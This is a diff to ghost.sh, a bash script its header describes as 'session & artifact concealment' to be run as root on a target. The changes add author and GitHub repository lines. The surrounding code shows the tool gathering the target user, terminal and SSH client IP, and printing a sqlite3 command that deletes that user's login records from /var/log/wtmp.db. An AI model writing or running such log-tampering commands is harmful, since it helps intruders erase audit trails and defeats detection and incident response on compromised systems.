@@ -1,6 +1,7 @@
 #!/bin/bash
 # ghost.sh - session & artifact concealment
 # run as root on target
+# https://github.com/thankgod4rob/ghost.sh
 
 RED='\033[0;31m'
 GRN='\033[0;32m'
@@ -42,6 +43,8 @@ if [[ $EUID -ne 0 ]]; then
     exit 1
 fi
 
+info "Author       : rob"
+info "Repo	       : https://github.com/thankgod4rob/ghost.sh"
 info "Target user  : $TARGET_USER"
 info "Current PTY  : $MY_PTS"
 info "SSH client IP: ${MY_IP:-not detected}"
@@ -389,3 +392,5 @@ echo -e "${RED}[!] Remember: wtmpdb (/var/log/wtmp.db) on this system may${NC}"
 echo -e "${RED}    persist entries sqlite3 can't be wiped by log scrubbing.${NC}"
 echo -e "${RED}    Run: sqlite3 /var/log/wtmp.db 'DELETE FROM wtmp WHERE user=\"$TARGET_USER\";'${NC}"
 echo ""
+
+# https://github.com/thankgod4rob/ghost.sh
